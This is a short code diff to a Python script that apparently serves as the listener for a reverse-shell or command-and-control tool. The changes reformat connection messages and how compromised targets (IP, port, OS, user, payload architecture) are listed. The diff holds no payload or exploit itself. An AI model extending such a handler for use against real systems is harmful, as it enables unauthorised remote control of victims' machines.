@@ -67,7 +67,7 @@ def accepting_connections():
             all_connections.append(conn)
             all_address.append(address)
 
-            print("Connection has been established :" + address[0])
+            print("Connection has been established: " + address[0])
 
         except:
             print("Error accepting connections")
@@ -114,9 +114,13 @@ def list_connections():
             del all_address[i]
             continue
 
-        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
+        results = str(i) + "   " + str(all_address[i][0]) + ":" + str(all_address[i][1]) + "\n"
+        current_conn = all_connections[i]
+        received_data = current_conn.recv(2048)
+        print('ID:    IP:PORT')
+        print(results)
+        
 
-    print('%s %5s %25s %15s %40s %25s' % ('ID:', 'IP:', 'HOSTNAME:', 'OS:', 'CURRENT_USER:', 'PAYLOAD_ARCH:')) + '\n' + results)
 
 
 # Selecting the target
